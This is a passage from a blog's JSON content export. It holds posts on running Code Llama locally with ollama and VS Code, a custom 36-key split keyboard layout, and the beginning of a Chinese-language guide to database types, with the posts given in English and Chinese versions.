11 WSL 2 與 Ubuntu Nvidia 3060 12GB https://github.com/jmorganca/ollama 如果您沒有足夠的顯示記憶體，它會退回到系統 RAM 和 CPU。 有許多模型供您選擇（https://ollama.ai/library），但您應該首先嘗試 Code Llama。您可以使用 ollama pull codellama 像 docker 映像一樣拉取 Code Llama。然而，有一個授權協議需要接受（https://ai.meta.com/resources/models-and-libraries/llama-downloads/）。一旦您請求、接受並獲得批准，您就可以開始使用它。如果您不這樣做，還有許多其他函式庫可以嘗試。 ❓ 為什麼我選擇顯示卡上的 12GB 顯示記憶體而不是 8GB、16GB、24GB？ 8GB 顯示卡更常見且更便宜，但額外的 4GB 顯示記憶體（VRAM）可以讓您在下一個層級執行更大的模型。LLM 通常以 3 個層級建構，具有不同的模型參數大小，每個層級大約使用一定量的 VRAM。下面顯示 12GB 適合 7B 和 13B。超過 12GB 的 RAM 是浪費，除非您花時間量化下一層級的模型並接受量化後模型執行速度會慢得多。Code Llama 提供了一個 34B 模型，您可以使用 24GB，這是 24GB 顯示卡的唯一使用案例。 模型 儲存大小 典型記憶體使用量 VRAM 8GB VRAM 12GB VRAM 24GB VRAM 2 X 24GB 7B 4GB 7GB ❌ ✅ ✅ ✅ 13B 8GB 11GB ❌ ❌ ✅ ✅ 34B 19GB 23GB ❌ ❌ ✅ ✅ 70B 40GB 35GB ❌ ❌ ❌ ✅ 消費級顯示卡的最大顯示記憶體大小為 24GB，因此您需要兩張顯示卡。 如何使用 Visual Studio Code 設定 Code Llama 使用 Visual Studio Code 設定 Code Llama 既簡單又直接。搜尋並安裝 Visual Studio Code 擴充功能「Continue」。此擴充功能允許您使用來自服務提供商的 LLM 和本機 LLM 服務（如 ollama）。「Continue」啟動互動式教學，您應該開始愉快地使用它。 本機 vs CoPilot（或任何其他基於訂閱的服務） 還有許多其他免費的類似 CoPilot 的服務提供商。免費服務的品質通常很差，所以我不會在下表中比較它們， 功能 本機 CoPilot（或任何其他基於訂閱的服務） 擁有成本 二手 nVidia 3060 12GB 200 美元。不包括我已經擁有的 PC 桌機 - 價格 免費。電費每月約 1kWh，可以忽略不計 基於訂閱，每月 10 美元起 ROI 20 個月 - 可供選擇的 LLM 許多。有特定程式語言的模型。 取決於提供商 輸入權杖限制 100k（Code Llama） 1500（Copilot） 設定 使用 ollama 相當容易 簡單 隱私 您的資料保留在本機 資料發送到第三方進行處理 輸入權杖是上下文的「記憶」。GPT4 的輸入權杖是 8k；這就是為什麼當您的需求複雜時，您會覺得生成的程式碼比 CoPilot 更好。請注意，由於技術進步迅速，數字可能不準確。 重要的是要記住，生成程式碼的品質不僅取決於使用的模型，還取決於系統提示和提供的上下文。這是因為有很多模型可以使用，提示可能比模型更重要。您可以自訂最適合您的系統提示，並從 Continue 瘋狂地在模型之間切換。例如，如果您沒有適當的系統提示或您的上下文已經混亂，Code Llama 和 GPT4 都可能生成以下糟糕的程式碼， 沒有系統提示 write a python function to generate six unique numbers from 1 to 49 import random def get_unique_numbers(n): nums &#x3D; [] while len(nums) &lt; n: num &#x3D; random.randint(1, 49) if num not in nums: nums.append(num) return nums 一個簡單的系統提示會產生很大的差異。更不用說您可以使用 ollama 和 Continue 輕鬆切換的其他參數，例如溫度 系統提示：您是一位經驗豐富的程式設計師，專注於使用單行程式碼解決問題。 Write a python function to generate six unique numbers from 1 to 49. def generate_unique_numbers(n): return random.sample(range(1, n), k&#x3D;6) 結論 安全和隱私是我最關心的問題。執行 LLM 是我的最佳選擇。","categories":[{"name":"AI","slug":"AI","permalink":"https://neo01.com/categories/AI/"}],"tags":[{"name":"AI","slug":"AI","permalink":"https://neo01.com/tags/AI/"}],"lang":"zh-TW"},{"title":"My Best CoPilot Alternative - Running LLM on Local Machine","slug":"2023/09/My_Best_CoPilot_Alternative_Running_LLM_on_Local_Machine","date":"un00fin00","updated":"un66fin66","comments":true,"path":"2023/09/My_Best_CoPilot_Alternative_Running_LLM_on_Local_Machine/","permalink":"https://neo01.com/2023/09/My_Best_CoPilot_Alternative_Running_LLM_on_Local_Machine/","excerpt":"Run Code Llama locally with a $200 used GPU. Keep your data private, get 100k tokens (vs CoPilot's 1500), and pay zero monthly fees. Setup guide with ollama + VS Code included.","text":"I’m always on the lookout for new and innovative tools to help me improve my coding skills and increase my productivity. Recently, I stumbled upon Code Llama, a free, open-source large language model (LLM) developed by Meta that allows you to set up on your low-cost gaming desktop. In this blog post, I’ll be sharing my experience with Code Llama and how it can serve as a great alternative to GitHub CoPilot. Setup Code Llama with ollama ollama (https://ollama.ai/), which uses a Dockerfile-like configuration file. It also manages Docker layers from LLM to system prompt. ollama helps a lot to setup and run Code Llama. Although the website says Windows is coming soon, I followed steps in https://github.com/jmorganca/ollama and ran it successfully. The following are my setup, Windows 11 WSL 2 with Ubuntu Nvidia 3060 12GB https://github.com/jmorganca/ollama If you do not have enough video RAM, it falls back to system RAM and CPU. There are many models for you to choose (https://ollama.ai/library) but you should first try Code Llama. You can pull the Code Llama with ollama pull codellama like a docker image. However, there is a license agreement to accept (https://ai.meta.com/resources/models-and-libraries/llama-downloads/). Once you have requested, accepted, and been approved, you can start using it. If you do not, there are many other libraries you can try. ❓ Why I choose 12GB Video RAM on display card instead of 8GB, 16GB, 24GB? 8GB video cards are more common and cheaper but with an additional 4GB of video RAM (VRAM) you can run a larger model in the next tier. LLMs are usually built in 3 tiers with different model parameter sizes, each tier using a certain amount of VRAM approximately. Below shows 12GB fits both 7B and 13B. RAM more than 12GB is a waste unless you spend time on quantizing the model for the next tier and accept that the model runs much slower after quantization. Code Llama provides a 34B model that you can use with 24GB, which is the only use case for a 24GB video card. Model Size in storage Typical memory usage VRAM 8GB VRAM 12GB VRAM 24GB VRAM 2 X 24GB 7B 4GB 7GB ❌ ✅ ✅ ✅ 13B 8GB 11GB ❌ ❌ ✅ ✅ 34B 19GB 23GB ❌ ❌ ✅ ✅ 70B 40GB 35GB ❌ ❌ ❌ ✅ The largest video RAM size for a consumer-grade display card is 24GB, so you will need two video cards. How to Set Up Code Llama with Visual Studio Code Setting up Code Llama with Visual Studio Code is easy and straightforward. Search and install a Visual Studio Code extension “Continue”. This extension allows you to use LLM from the service provider and local LLM service like ollama. “Continue” starts an interactive tutorial and you should start to use it happily. Local vs CoPilot (or any other subscription-based service) There are many other CoPilot-like service providers that are free. Quality from free services is usually poor, so I will not compare them in the table below, Feature Local CoPilot (or any other subscription-based service) Cost of Ownership USD 200 for a second-hand nVidia 3060 12GB. Excluding the PC desktop that I already have - Price Free. Electricity costs me around 1kWh a month, which is negligible Subscription-based, starting from USD 10 a month ROI 20 months - LLM for you to choose Many. There are programming language-specific models. Depends on the provider Input token limit 100k (Code Llama) 1500 (Copilot) Setup Quite easy with ollama Easy Privacy Your data stays on your local machine Data is sent to third party for processing Input token is the “memory” of the context. GPT4’s input token is 8k; that’s why you feel the code generated is better than CoPilot when your requirement is complex. Please note the number could be inaccurate as technology is advancing quickly. It’s important to remember that the quality of the generated code is not just determined by the model used, but also by the system prompts and the context provided. This is because there are so many models you can use, and the prompt could matter more than a model. You can customize system prompts that fit you best and switch between models like crazy from Continue. For example, the poor code below could be generated from both Code Llama and GPT4 if you do not have a proper system prompt or if your context has been messed up, No system prompt write a python function to generate six unique numbers from 1 to 49 import random def get_unique_numbers(n): nums &#x3D; [] while len(nums) &lt; n: num &#x3D; random.randint(1, 49) if num not in nums: nums.append(num) return nums A simple system prompt makes a great difference. Not to mention other parameters such as temperature you can switch easily with ollama and Continue System prompt: You are a seasoned programmer with a focus on using a single line of code to solve a problem. Write a python function to generate six unique numbers from 1 to 49. def generate_unique_numbers(n): return random.sample(range(1, n), k&#x3D;6) Conclusion Security and privacy are my top concerns. Running LLM is my best choice.","categories":[{"name":"AI","slug":"AI","permalink":"https://neo01.com/categories/AI/"}],"tags":[{"name":"AI","slug":"AI","permalink":"https://neo01.com/tags/AI/"}]},{"title":"我的分离式键盘键位配置","slug":"2023/08/KeyMap_Of_My_Split_Keyboard-zh-CN","date":"un33fin33","updated":"un00fin00","comments":true,"path":"/zh-CN/2023/08/KeyMap_Of_My_Split_Keyboard/","permalink":"https://neo01.com/zh-CN/2023/08/KeyMap_Of_My_Split_Keyboard/","excerpt":"36键分离式键盘如何提高生产力?探索QGMLWY布局和单手导航的人体工学设计。","text":"设计 定制 36 键分离式键盘可以显著提高生产力，特别是对于像我这样需要单手键盘导航的人。通过左手拇指启动的专用层，方向键很容易访问，允许与鼠标无缝协作导航。左手按键针对频繁使用进行了优化，确保最常用的功能触手可及，这减少了在键盘和鼠标之间切换的频率。此外，数字键盘层分配给右侧，实现快速数字输入。 右手拇指启动功能键层，而另一个由右手启动的层则保留给符号，简化复杂输入。符号的布局类似于传统键位配置。相反的手持有修饰键——shift、control、alt 和 GUI——在键盘上平衡功能。这种周到的布局体现了精心设计的自定义键位配置的效率。 最后，键位布局是 QGMLWY，已被证明比 QWERTY 更符合人体工学。 设计原则 将常用按键保持在左手。 低学习曲线和记忆负担。 使用拇指启动层。 在启动层后，在相反的手上使用修饰键（Shift、Control、Alt、GUI）。 使用 QGMLWY 在右手包含数字键盘层以快速输入数字。 基础层 Q G M L W Y F U B ; D S T N R I A E O H Z X C V J K P , . / ⇧SPACE⌫⏎TAB⇧ 左手层 🔈⏯VOL⏷VOL⏶[ ] 7 8 9 ⠀ GUI ALT CTRL ⇧ ( ) 4 5 6 ⠀ + - * / { } 1 2 3 ⠀ ⇧HOLD⠀0 . ⇧ ESC HOME ⏶END PGUP ⠀⠀⠀⠀⠀ TAB ⏴⏷⏵PGDN CAPS ⇧CTRL ALT GUI ⏎⠀INS DEL ⠀⠀⠀⠀⠀⠀ ⇧⠀HOLD⠀⠀⇧ 右手层 ⠀⠀⠀⠀⠀⠀F7 F8 F9 F10 GUI ALT CTRL ⇧⠀INS F4 F5 F6 F11 ⠀⠀⠀⠀⠀DEL F1 F2 F3 F12 ⇧⠀⠀HOLD⠀⇧ ! @ # $ % ^ &amp; * = GAME GUI ALT CTRL ⇧| \\ ⇧CTRL ALT GUI ~ ` _ ’ &quot; ⠀CAPS ⠀⠀BASE ⇧- + ⠀HOLD⇧ 游戏层 ESC 1 2 3 4 5 6 7 8 9 0 ⌫ TAB Q W E R T Y U I O P BASE ⇧A S D F G H J K L ; ⇧ CTRL Z X C V B N M , . / CTRL GUIALTSPACE⏎ALT⠀ 按键说明 ⠀ - 按住以启动层 ⠀ - 切换到层 ⠀ - 待更新","categories":[{"name":"Misc","slug":"Misc","permalink":"https://neo01.com/categories/Misc/"}],"tags":[],"lang":"zh-CN"},{"title":"Keymap of My Split Keyboard","slug":"2023/08/KeyMap_Of_My_Split_Keyboard","date":"un33fin33","updated":"un00fin00","comments":true,"path":"2023/08/KeyMap_Of_My_Split_Keyboard/","permalink":"https://neo01.com/2023/08/KeyMap_Of_My_Split_Keyboard/","excerpt":"How does a 36-key split keyboard boost productivity? Discover the ergonomic design with QGMLWY layout, thumb-activated layers, and one-handed navigation.","text":"The Design Customizing a 36-key split keyboard can significantly enhance productivity, especially for those who, like myself, require one-handed navigation with a keyboard. With a dedicated layer activated by the left thumb, arrow keys are easily accessible, allowing for seamless navigation in tandem with a mouse. The left-hand keys are optimized for frequent use, ensuring the most commonly used functions are at my fingertips, which reduces the frequency of switching between keyboard and mouse. Additionally, a numpad layer is assigned to the right side, enabling quick number entry. The right thumb activates a layer for function keys, while another layer, activated by the right hand, is reserved for symbols, streamlining complex inputs. The layout of symbols resembles a traditional keymap. Opposite hands hold the modifier keys—shift, control, alt, and GUI—balancing functionality across the keyboard. This thoughtful layout exemplifies the efficiency of a well-designed custom key map. Lastly, the key layout is QGMLWY, which has been proven to be more ergonomic than QWERTY. Design principles Keep frequently used keys on the left hand. Low learning curve and memorization. Use thumb to activate layers. Use modifier keys (Shift, Control, Alt, GUI) on opposite hands after a layer is activated. Use QGMLWY Include a numpad layer on the right hand for entering numbers quickly. Base Layer Q G M L W Y F U B ; D S T N R I A E O H Z X C V J K P , . / ⇧SPACE⌫⏎TAB⇧ Left Hand Layers 🔈⏯VOL⏷VOL⏶[ ] 7 8 9 ⠀ GUI ALT CTRL ⇧ ( ) 4 5 6 ⠀ + - * / { } 1 2 3 ⠀ ⇧HOLD⠀0 . ⇧ ESC HOME ⏶END PGUP ⠀⠀⠀⠀⠀ TAB ⏴⏷⏵PGDN CAPS ⇧CTRL ALT GUI ⏎⠀INS DEL ⠀⠀⠀⠀⠀⠀ ⇧⠀HOLD⠀⠀⇧ Right Hand Layers ⠀⠀⠀⠀⠀⠀F7 F8 F9 F10 GUI ALT CTRL ⇧⠀INS F4 F5 F6 F11 ⠀⠀⠀⠀⠀DEL F1 F2 F3 F12 ⇧⠀⠀HOLD⠀⇧ ! @ # $ % ^ &amp; * = GAME GUI ALT CTRL ⇧| \\ ⇧CTRL ALT GUI ~ ` _ ’ &quot; ⠀CAPS ⠀⠀BASE ⇧- + ⠀HOLD⇧ Gaming Layer ESC 1 2 3 4 5 6 7 8 9 0 ⌫ TAB Q W E R T Y U I O P BASE ⇧A S D F G H J K L ; ⇧ CTRL Z X C V B N M , . / CTRL GUIALTSPACE⏎ALT⠀ Keys ⠀ - Hold to activate layer ⠀ - Switch to layer ⠀ - To be update","categories":[{"name":"Misc","slug":"Misc","permalink":"https://neo01.com/categories/Misc/"}],"tags":[]},{"title":"我的分離式鍵盤鍵位配置","slug":"2023/08/KeyMap_Of_My_Split_Keyboard-zh-TW","date":"un33fin33","updated":"un00fin00","comments":true,"path":"/zh-TW/2023/08/KeyMap_Of_My_Split_Keyboard/","permalink":"https://neo01.com/zh-TW/2023/08/KeyMap_Of_My_Split_Keyboard/","excerpt":"36鍵分離式鍵盤如何提高生產力?探索QGMLWY佈局和單手導航的人體工學設計。","text":"設計 客製化 36 鍵分離式鍵盤可以顯著提高生產力，特別是對於像我這樣需要單手鍵盤導航的人。通過左手拇指啟動的專用層，方向鍵很容易訪問，允許與滑鼠無縫協作導航。左手按鍵針對頻繁使用進行了優化，確保最常用的功能觸手可及，這減少了在鍵盤和滑鼠之間切換的頻率。此外，數字鍵盤層分配給右側，實現快速數字輸入。 右手拇指啟動功能鍵層，而另一個由右手啟動的層則保留給符號，簡化複雜輸入。符號的佈局類似於傳統鍵位配置。相反的手持有修飾鍵——shift、control、alt 和 GUI——在鍵盤上平衡功能。這種周到的佈局體現了精心設計的自訂鍵位配置的效率。 最後，鍵位佈局是 QGMLWY，已被證明比 QWERTY 更符合人體工學。 設計原則 將常用按鍵保持在左手。 低學習曲線和記憶負擔。 使用拇指啟動層。 在啟動層後，在相反的手上使用修飾鍵（Shift、Control、Alt、GUI）。 使用 QGMLWY 在右手包含數字鍵盤層以快速輸入數字。 基礎層 Q G M L W Y F U B ; D S T N R I A E O H Z X C V J K P , . / ⇧SPACE⌫⏎TAB⇧ 左手層 🔈⏯VOL⏷VOL⏶[ ] 7 8 9 ⠀ GUI ALT CTRL ⇧ ( ) 4 5 6 ⠀ + - * / { } 1 2 3 ⠀ ⇧HOLD⠀0 . ⇧ ESC HOME ⏶END PGUP ⠀⠀⠀⠀⠀ TAB ⏴⏷⏵PGDN CAPS ⇧CTRL ALT GUI ⏎⠀INS DEL ⠀⠀⠀⠀⠀⠀ ⇧⠀HOLD⠀⠀⇧ 右手層 ⠀⠀⠀⠀⠀⠀F7 F8 F9 F10 GUI ALT CTRL ⇧⠀INS F4 F5 F6 F11 ⠀⠀⠀⠀⠀DEL F1 F2 F3 F12 ⇧⠀⠀HOLD⠀⇧ ! @ # $ % ^ &amp; * = GAME GUI ALT CTRL ⇧| \\ ⇧CTRL ALT GUI ~ ` _ ’ &quot; ⠀CAPS ⠀⠀BASE ⇧- + ⠀HOLD⇧ 遊戲層 ESC 1 2 3 4 5 6 7 8 9 0 ⌫ TAB Q W E R T Y U I O P BASE ⇧A S D F G H J K L ; ⇧ CTRL Z X C V B N M , . / CTRL GUIALTSPACE⏎ALT⠀ 按鍵說明 ⠀ - 按住以啟動層 ⠀ - 切換到層 ⠀ - 待更新","categories":[{"name":"Misc","slug":"Misc","permalink":"https://neo01.com/categories/Misc/"}],"tags":[],"lang":"zh-TW"},{"title":"理解数据库类型：完整指南","slug":"2023/07/Understanding_Database_Types_A_Comprehensive_Guide-zh-CN","date":"un44fin44","updated":"un55fin55","comments":true,"path":"/zh-CN/2023/07/Understanding_Database_Types_A_Comprehensive_Guide/","permalink":"https://neo01.com/zh-CN/2023/07/Understanding_Database_Types_A_Comprehensive_Guide/","excerpt":"从关系型到图形数据库 - 探索多样化的数据存储系统世界，学习哪种数据库类型适合您的应用程序需求。","text":"还记得您第一次需要为应用程序存储数据吗？您可能随手选了一个听过的数据库 - 也许是 MySQL 或 PostgreSQL - 没有多想它是否是正确的选择。它能用，所以您就继续了。但随着应用程序成长，您可能遇到了瓶颈：查询缓慢、扩展挑战，或数据结构就是无法适配关系型模型。 事实是：数据库并非一体适用。过去二十年来，数据库领域已经爆炸性成长，从关系型数据库的主导地位演变为丰富的专业化存储系统生态系统。每种类型都针对特定使用案例、数据模式和性能需求进行优化。 选择错误的数据库就像在需要螺丝刀时使用锤子 - 可能有用，但您会不必要地挣扎。理解不同类型的数据库及其优势，有助于您做出明智的决策，节省时间、金钱和麻烦。 💡 什么是数据库？数据库是结构化信息或数据的有组织集合，通常以电子方式存储在计算机系统中。数据库管理系统（DBMS）控制数据库，允许用户有效且安全地创建、读取、更新和删除数据。 数据库演进：从文件到专业化系统 在深入探讨特定数据库类型之前，让我们先了解我们是如何走到这一步的。在计算的早期，应用程序将数据存储在平面文件中 - 简单的文本文件，记录由分隔符分隔。这对小型数据集有效，但随着数据增长很快就变得难以管理。 1970 年代的关系型数据库革命改变了一切。Edgar F. Codd 的关系型模型引入了具有关系的结构化表格，通过 SQL（结构化查询语言）实现复杂查询。数十年来，Oracle、MySQL 和 PostgreSQL 等关系型数据库主导了这个领域，这是有充分理由的 - 它们提供了一致性、可靠性和强大的查询能力。 但互联网时代带来了新挑战。网络应用程序需要处理大规模、不可预测的流量高峰，以及无法整齐地放入表格的多样化数据类型。这引发了 2000 年代的 NoSQL 运动，引入了针对特定使用案例优化的数据库：用于灵活模式的文档存储、用于速度的键值存储、用于分析的列存储，以及用于连接数据的图形数据库。 今天，我们生活在一个多语言持久化的世界，应用程序使用多种数据库类型，每种都处理最适合它的工作负载。您的电子商务网站可能使用关系型数据库处理交易、文档存储处理产品目录、缓存处理会话数据，以及图形数据库处理推荐。 timeline title 数据库系统的演进 1970s : 关系型数据库 : SQL 和 ACID 事务 : Oracle, IBM DB2 1980s-1990s : 成熟与主导 : MySQL, PostgreSQL : 企业采用 2000s : NoSQL 运动 : 网络规模挑战 : MongoDB, Cassandra, Redis 2010s : 专业化系统 : 图形、时间序列、NewSQL : 多语言持久化 2020s : 云原生与分布式 : 无服务器数据库 : 多模型系统 关系型数据库（RDBMS）：基础 关系型数据库将数据组织成表格（关系），包含行和列。每个表格都有定义的模式，指定列名称和数据类型。表格可以通过外键连接，在数据之间建立关系。 运作方式 数据存储在具有严格模式的表格中。当您查询数据时，数据库引擎使用 SQL 来连接表格、过滤行和聚合结果。关系型数据库强制执行 ACID 属性（原子性、一致性、隔离性、持久性）以确保数据完整性，使其成为正确性至关重要的应用程序的理想选择。 ACID 属性说明： 原子性：事务是全有或全无；如果一部分失败，整个事务回滚 一致性：数据必须符合所有验证规则和约束 隔离性：并发事务不会互相干扰 持久性：一旦提交，数据即使系统崩溃也会持久存在 优势 数据完整性：外键、约束和事务确保数据保持一致和有效。您无法意外创建孤立记录或违反业务规则。 复杂查询：SQL 提供强大的功能来连接多个表格、聚合数据和执行复杂的分析查询。需要找到上个月购买产品 X 但没有购买产品 Y 的所有客户？SQL 可以优雅地处理这个问题。 成熟的生态系统：数十年的开发产生了强大的备份、复制、监控和优化工具。知识库广泛，熟练的开发人员众多。 标准化：SQL 在数据库之间是标准化的，使得切换供应商或使用具有类似查询语言的多个系统变得更容易。 劣势 僵化的模式：在生产环境中更改表格结构可能复杂且有风险，特别是对于大型数据集。添加列可能需要停机或冗长的迁移。 扩展挑战：水平扩展（增加更多服务器）很困难，因为在分布式系统中维护 ACID 属性很复杂。大多数关系型数据库垂直扩展（更大的服务器），这有限制。 性能开销：ACID 保证和复杂的查询优化增加了开销。对于简单的键值查找，关系型数据库是过度的。 最佳使用案例 金融系统：银行、会计、支付处理，数据完整性至关重要 电子商务交易：订单处理、库存管理、客户账户 企业应用程序：ERP、CRM 系统，实体之间具有复杂关系 内容管理：具有结构化内容和关系的系统 热门示例 PostgreSQL：开源、功能丰富、适合复杂查询和 JSON 支持 MySQL：广泛使用、易于设置、适合网络应用程序 Oracle Database：企业级、强大功能、高成本 Microsoft SQL Server：Windows 生态系统集成、强大的商业智能工具 IBM DB2：企业数据库、在大型主机上表现强劲、适合大规模事务系统 🎬 真实世界情境在线书店使用 PostgreSQL 进行核心运营： Customers 表格：用户账户、地址、付款方式 Books 表格：ISBN、标题、作者、价格、库存 Orders 表格：订单详情、状态、时间戳 Order_items 表格：将订单连接到书籍及数量 当客户下订单时，事务确保： 库存减少 创建订单记录 处理付款 如果任何步骤失败，一切都会回滚 - 没有部分订单或库存差异。 graph TB A([👤 客户]) --> B([📦 订单]) C([📚 书籍]) --> D([📋 订单项目]) B --> D D --> C style A fill:#e3f2fd,stroke:#1976d2,stroke-width:2px style B fill:#fff3e0,stroke:#f57c00,stroke-width:2px style C fill:#e8f5e9,stroke:#388e3c,stroke-width:2px style D fill:#f3e5f5,stroke:#7b1fa2,stroke-width:2px 文档数据库：灵活且无模式 文档数据库将数据存储为文档，通常采用 JSON 或 BSON 格式。与具有僵化模式的关系型数据库不同，文档数据库允许每个文档具有不同的字段，为不断演变的数据结构提供灵活性。 运作方式 每个文档都是一个自包含的单元，包含所有相关数据。文档数据库不是将客户信息分散在多个表格中，而是将所有内容存储在一个文档中：客户详情、地址、订单历史和偏好。文档组织成集合（类似于表格），可以使用文档特定的查询语言进行查询。 优势 模式灵活性：无需迁移即可添加字段。同一集合中的不同文档可以具有不同的结构，非常适合不断演变的应用程序。 自然的数据建模：文档自然地映射到编程语言中的对象。您的应用程序数据结构可以直接存储，无需复杂的对象关系映射。 性能：检索文档可在一次操作中获取所有相关数据，避免昂贵的连接。这使得读取操作快速。 水平扩展：大多数文档数据库专为分布式系统设计，使得跨多个服务器扩展更容易。 劣势 数据重复：非规范化数据意味着相同的信息可能存储在多个文档中，增加存储需求和更新复杂性。 有限的事务：虽然现代文档数据库支持事务，但与关系型数据库相比通常受到限制，特别是跨多个文档或集合。 查询复杂性：涉及多个集合的复杂查询可能具有挑战性，效率不如 SQL 连接。 一致性权衡：许多文档数据库优先考虑可用性和分区容错性，而不是即时一致性（最终一致性模型）。 最佳使用案例 内容管理：博客、新闻网站，内容结构各异 用户配置文件：社交网络、游戏平台，具有多样化的用户数据 产品目录：电子商务，产品属性各异 实时分析：事件记录、用户行为跟踪 移动应用程序：离线优先的应用程序，与云数据库同步 热门示例 MongoDB：最受欢迎的文档数据库、丰富的查询语言、良好的工具 Couchbase：高性能、内置缓存、移动同步功能 Amazon DocumentDB：MongoDB 兼容、完全托管的 AWS 服务 Firebase Firestore：实时同步、适合移动和网络应用程序 🎬 真实世界情境博客平台使用 MongoDB 存储文章： { &quot;_id&quot;: &quot;article123&quot;, &quot;title&quot;: &quot;理解数据库&quot;, &quot;author&quot;: &#123; &quot;name&quot;: &quot;Jane Doe&quot;, &quot;email&quot;: &quot;jane@example.com&quot; &#125;, &quot;content&quot;: &quot;...&quot;, &quot;tags&quot;: [&quot;数据库&quot;, &quot;教程&quot;], &quot;comments&quot;: [ &#123; &quot;user&quot;: &quot;John&quot;, &quot;text&quot;: &quot;很棒的文章！&quot;, &quot;timestamp&quot;: &quot;2023-07-15T10:30:00Z&quot; &#125; ], &quot;published&quot;: true, &quot;views&quot;: 1523 &#125; 与文章相关的所有内容 - 作者信息、评论、标签 - 都在一个文档中。检索文章只需要一次查询，不需要多次连接。 键值存储：速度与简单性 键值存储是最简单的数据库类型，将数据存储为键值对的集合。可以将其视为一个巨大的哈希映射或字典，您使用唯一键存储值并立即检索它们。 运作方式 数据仅通过键访问。您提供一个键，数据库返回相关的值。没有查询语言、没有连接、没有复杂操作 - 只有快速查找。值可以是任何东西：字符串、数字、JSON 对象或二进制数据。 优势 极致性能：键值查找非常快，通常在亚毫秒级。这使它们成为缓存和高吞吐量应用程序的理想选择。 水平扩展：简单的数据模型使得使用一致性哈希或类似技术在多个服务器之间分配数据变得容易。 简单性：最小的复杂性意味着出错的可能性更少。易于理解、部署和维护。 灵活性：值可以是任何数据类型，数据库不关心它们的结构。 劣势 有限的查询：您只能通过键检索数据。没有搜索、过滤或聚合，除非构建自定义索引。 没有关系：没有内置的数据关系支持。您必须在应用程序代码中管理关系。 数据建模挑战：设计有效的键结构需要仔细规划。糟糕的键设计导致低效的访问模式。 最佳使用案例 缓存：会话数据、API 响应、计算结果 会话管理：网络应用程序用户会话 实时数据：排行榜、计数器、速率限制 购物车：不需要复杂查询的临时数据 配置存储：应用程序设置、功能标志 热门示例 Redis：内存存储、丰富的数据结构（列表、集合、有序集合）、发布/订阅消息 Amazon DynamoDB：完全托管、可预测的性能、自动扩展 Memcached：简单、高性能缓存 Riak：分布式、高可用性、适合大规模部署 🎬 真实世界情境电子商务网站使用 Redis 进行会话管理： Key: &quot;session:abc123&quot; Value: &#123; &quot;user_id&quot;: 456, &quot;cart&quot;: [&quot;item1&quot;, &quot;item2&quot;], &quot;last_activity&quot;: &quot;2023-07-15T14:30:00Z&quot; &#125; 当用户发出请求时，应用程序： 1. 从 cookie 中提取会话 ID 2. 在 Redis 中查找会话数据（&lt; 1ms） 3. 使用会话上下文处理请求 4. 如需要则更新会话数据 这比每次请求都查询关系型数据库快得多。 列族存储：大规模分析 列族存储（也称为宽列存储）将数据组织成列而不是行。虽然这听起来类似于关系型数据库，但架构根本不同，并针对不同的使用案例进行优化。 运作方式 数据存储在列族中 - 相关列的组。与将整行存储在一起的关系型数据库不同，列存储将每列的数据保持在一起。这使得读取跨多行的特定列非常高效，非常适合聚合数据的分析查询。 面向行与面向列的存储： 面向行（RDBMS）：将一行的所有列存储在一起。快速检索完整记录。 面向列：将一列的所有值存储在一起。快速聚合跨多行的特定列。 优势 分析性能：扫描数百万行中特定列的查询非常快，因为只从磁盘读取相关列。 压缩：将相似数据存储在一起可实现更好的压缩比，降低存储成本并提高 I/O 性能。 可扩展性：专为分布式系统设计，处理数千台服务器上的 PB 级数据。 灵活的模式：与文档数据库类似，列存储允许在不进行模式迁移的情况下添加列。 劣势 写入性能：针对读取而非写入进行优化。插入或更新数据可能比面向行的数据库慢。 复杂查询：涉及许多列或复杂连接的查询可能效率低下。 学习曲线：不同的数据建模方法需要重新思考如何构建数据。 最佳使用案例 数据仓库：商业智能、报告、分析 时间序列数据：IoT 传感器数据、应用程序指标、日志 事件记录：用户活动跟踪、审计轨迹 推荐引擎：分析用户行为模式 金融分析：处理大型数据集进行风险分析、欺诈检测 热门示例 Apache Cassandra：分布式、高可用性、线性可扩展性 Apache HBase：构建在 Hadoop 上、适合大数据的实时读写访问 Google Bigtable：托管服务、支持许多 Google 产品 Amazon Redshift：数据仓库服务、SQL 接口、列式存储 🎬 真实世界情境社交媒体平台使用 Cassandra 存储用户活动： Column Family: user_activity Row Key: user_id Columns: timestamp1:action1, timestamp2:action2, ... 查询：「显示用户 123 在 2023 年 7 月的所有帖子」 数据库有效地仅扫描用户 123 的相关列族，按时间戳过滤。即使有数百万用户的数十亿活动，查询也能在毫秒内返回结果。 graph LR A([📊 分析查询]) --> B([列存储]) B --> C([仅读取需要的列]) C --> D([⚡ 快速聚合]) E([📊 相同查询]) --> F([行存储]) F --> G([读取所有列]) G --> H([🐌 较慢处理]) style D fill:#e8f5e9,stroke:#388e3c,stroke-width:2px style H fill:#ffebee,stroke:#c62828,stroke-width:2px 图形数据库：关系优先 图形数据库专为关系与数据本身同样重要的数据而设计。它们将数据存储为节点（实体）和边（关系），使得建模和查询连接数据变得自然。 运作方式 图形数据库不使用表格或文档，而是使用节点来表示实体（人、产品、位置）和边来表示关系（认识、购买、位于）。节点和边都可以具有属性。遍历关系非常高效，因为关系是一等公民，而不是需要连接的外键。 优势 关系查询：在数据中寻找连接、路径和模式是自然且快速的。像「朋友的朋友」或「最短路径」这样的查询简单且高效。 灵活的模式：易于添加节点类型和关系类型，无需重组现有数据。 性能：无论数据库大小如何，关系遍历性能都是恒定的，不像关系型数据库中的连接会随着数据增长而变慢。 直观的建模：图形结构自然地映射到许多真实世界场景：社交网络、组织层次结构、推荐系统。 劣势 有限的聚合：不针对聚合大量数据的分析查询进行优化。 扩展挑战：在多个服务器之间分配图形数据很复杂，因为关系通常跨越分区。 学习曲线：图形查询语言（如 Cypher）与 SQL 不同，需要开发人员学习新概念。 对简单数据过度：如果您的数据没有复杂的关系，图形数据库会增加不必要的复杂性。 最佳使用案例 社交网络：朋友连接、关注者关系、内容分享 推荐引擎：「购买 X 的客户也购买了 Y」 欺诈检测：在交易网络中寻找可疑模式 知识图谱：维基百科风格的互连信息 网络拓扑：IT 基础设施、电信网络 访问控制：复杂的权限层次结构和基于角色的访问 热门示例 Neo4j：最受欢迎的图形数据库、Cypher 查询语言、优秀的工具 Amazon Neptune：完全托管、支持属性图和 RDF 模型 ArangoDB：多模型数据库，具有强大的图形功能 JanusGraph：分布式、可扩展、构建在其他存储后端之上 🎬 真实世界情境社交网络使用 Neo4j 建模用户关系： // 寻找喜欢徒步的朋友的朋友 MATCH (me:User &#123;id: 123&#125;)-[:FRIENDS_WITH]-&gt;(friend)-[:FRIENDS_WITH]-&gt;(fof) WHERE (fof)-[:LIKES]-&gt;(:Interest 